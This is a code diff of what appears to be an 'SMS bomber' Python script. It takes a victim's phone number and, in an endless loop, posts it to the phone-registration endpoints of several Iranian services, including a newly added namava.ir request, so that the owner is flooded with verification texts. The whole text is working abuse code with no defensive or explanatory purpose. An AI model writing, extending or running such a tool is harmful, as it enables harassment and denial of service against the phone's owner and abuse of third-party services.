@@ -5,7 +5,8 @@ if len(sys.argv) != 2:
     sys.exit()
 else:
     phone = sys.argv[1].strip()
-    phone_shad = phone.replace("0","98")
+    phone_shad = '98' + phone[1:]
+    phone2 = '+98' + phone[1:]
     while True:
         try:
             hamyarzaban_data = {'phone':phone}
@@ -67,3 +68,9 @@ else:
             print(f'lenz status {lenz}')
         except:
             print('lenz not')
+        try:
+            data_namavi = {"UserName":phone2}
+            namavi = requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', json=data_namavi)
+            print(f'namavi status {namavi}')
+        except:
+            print('namavi not')
